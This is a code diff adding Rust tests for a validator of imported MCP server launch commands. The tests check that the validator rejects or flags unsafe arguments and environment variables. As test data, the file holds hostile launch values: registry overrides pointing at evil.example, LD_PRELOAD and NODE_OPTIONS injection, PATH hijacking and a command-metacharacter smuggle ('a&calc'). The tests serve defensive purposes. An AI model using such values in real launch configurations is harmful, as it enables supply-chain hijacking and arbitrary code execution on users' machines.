@@ -1308,3 +1308,147 @@ async fn a_cmd_metacharacter_in_registry_argv_is_unsupported_and_in_a_typed_one_
         );
     }
 }
+
+fn stdio_import(command: &str, args: &[&str]) -> PlanSource {
+    import_source(&json!({ "command": command, "args": args }).to_string())
+}
+
+fn launch_argument(command: &str, argument: &str) -> McpCatalogReason {
+    McpCatalogReason::UnsupportedLaunchArgument {
+        command: command.to_string(),
+        argument: argument.to_string(),
+    }
+}
+
+fn denied(name: &str) -> McpCatalogReason {
+    McpCatalogReason::DeniedEnv {
+        name: name.to_string(),
+    }
+}
+
+#[tokio::test]
+async fn an_imported_runner_must_take_the_template_shape() {
+    let service = service();
+    for (command, args, reason) in [
+        (
+            "npx",
+            vec!["-p", "ok@1.0.0", "--registry", "https://evil.example", "ok"],
+            launch_argument("npx", "-p"),
+        ),
+        (
+            "C:\\nodejs\\NPX.CMD",
+            vec!["--registry=https://evil.example", "-y", "ok@1.0.0"],
+            launch_argument("npx", "--registry=https://evil.example"),
+        ),
+        (
+            "uvx",
+            vec!["--with", "ok", "--index-url", "https://evil.example", "tool"],
+            launch_argument("uvx", "--with"),
+        ),
+        ("npx", vec!["-y"], McpCatalogReason::InvalidPackage),
+        ("uvx", vec!["git+https://h/r"], McpCatalogReason::InvalidPackage),
+        (
+            "docker",
+            vec!["run", "-i", "--rm", "--network", "host", "ghcr.io/a/b:1.0"],
+            launch_argument("docker", "--network"),
+        ),
+        (
+            "docker",
+            vec!["run", "-i", "--rm", "-e", "TOKEN=abc", "ghcr.io/a/b:1.0"],
+            launch_argument("docker", "-e TOKEN=…"),
+        ),
+        (
+            "docker",
+            vec!["run", "-i", "--rm", "-e", "NODE_OPTIONS", "ghcr.io/a/b:1.0"],
+            denied("NODE_OPTIONS"),
+        ),
+        ("docker", vec!["exec", "box"], launch_argument("docker", "exec")),
+        (
+            "dotnet",
+            vec!["dnx", "Time.Mcp@1.0.0", "--yes", "--add-source", "https://evil.example"],
+            launch_argument("dotnet", "--add-source"),
+        ),
+        ("dotnet", vec!["tool", "run", "x"], launch_argument("dotnet", "tool")),
+        (
+            "npx.exe",
+            vec!["-y", "ok@1.0.0", "a&calc"],
+            McpCatalogReason::CmdMetacharacter {
+                field: "args[2]".to_string(),
+            },
+        ),
+    ] {
+        assert_eq!(
+            unsupported(&service, stdio_import(command, &args)).await,
+            reason,
+            "{command} {args:?}"
+        );
+    }
+    for (command, args) in [
+        ("npx", vec!["-y", "@scope/ok@1.0.0", "--port", "3000"]),
+        ("uvx", vec!["mcp-server-fetch@1.0", "--flag"]),
+        (
+            "docker",
+            vec!["run", "-i", "--rm", "-e", "TOKEN", "-v", "/data:/data", "ghcr.io/a/b:1.0", "--x"],
+        ),
+        ("dotnet", vec!["dnx", "Time.Mcp@1.0.0", "--yes", "--", "--port", "1"]),
+        ("node", vec!["srv.js", "a&b"]),
+    ] {
+        let plan = plan(&service, stdio_import(command, &args), &[]).await;
+        assert_eq!(plan.consent_view.argv.len(), args.len() + 1, "{command}");
+    }
+}
+
+#[tokio::test]
+async fn a_denied_env_name_is_unsupported_however_the_import_carries_it() {
+    let service = service();
+    for (command, args, reason) in [
+        ("env", vec!["NODE_OPTIONS=--require=./x.js", "node", "srv.js"], denied("NODE_OPTIONS")),
+        ("/usr/bin/env", vec!["-i", "PATH=/tmp/evil", "node", "srv.js"], denied("PATH")),
+        ("sudo", vec!["npm_config_registry=https://evil.example", "node"], denied("npm_config_registry")),
+        ("systemd-run", vec!["--setenv=NODE_OPTIONS=x", "node"], denied("NODE_OPTIONS")),
+        ("bash", vec!["-c", "LD_PRELOAD=/tmp/x.so node srv.js"], denied("LD_PRELOAD")),
+        (
+            "env",
+            vec!["FOO=1", "npx", "--registry", "https://evil.example", "ok"],
+            launch_argument("npx", "--registry"),
+        ),
+        ("env", vec!["-S", "node srv.js"], launch_argument("env", "-S")),
+        ("nohup", vec!["uvx", "--index-url", "https://evil.example", "x"], launch_argument("uvx", "--index-url")),
+        ("env", vec!["FOO=1"], McpCatalogReason::InvalidCommand),
+    ] {
+        assert_eq!(
+            unsupported(&service, stdio_import(command, &args)).await,
+            reason,
+            "{command} {args:?}"
+        );
+    }
+}
+
+#[tokio::test]
+async fn a_shell_or_interpreter_given_inline_code_carries_a_danger_warning() {
+    let service = service();
+    for (command, args, inline) in [
+        ("bash", vec!["-c", "node srv.js"], true),
+        ("/bin/sh", vec!["-lc", "node srv.js"], true),
+        ("cmd.exe", vec!["/C", "node srv.js"], true),
+        ("pwsh", vec!["-File", "srv.ps1"], true),
+        ("node", vec!["-e", "require('x')"], true),
+        ("node", vec!["--eval=require('x')"], true),
+        ("python3.12", vec!["-Ic", "import x"], true),
+        ("deno", vec!["eval", "1"], true),
+        ("perl", vec!["-E", "say 1"], true),
+        ("env", vec!["FOO=1", "python", "-c", "import x"], true),
+        ("node", vec!["srv.js"], false),
+        ("bash", vec!["srv.sh"], false),
+        ("python", vec!["-m", "srv"], false),
+        ("npx", vec!["-y", "ok@1.0.0", "-e", "x"], false),
+    ] {
+        let plan = plan(&service, stdio_import(command, &args), &[]).await;
+        let mut expected = vec![ConsentWarning::RunsLocalCode];
+        if inline {
+            expected.push(ConsentWarning::RunsInlineCode);
+        }
+        expected.push(ConsentWarning::FromFile);
+        assert_eq!(plan.consent_view.warnings, expected, "{command} {args:?}");
+    }
+}
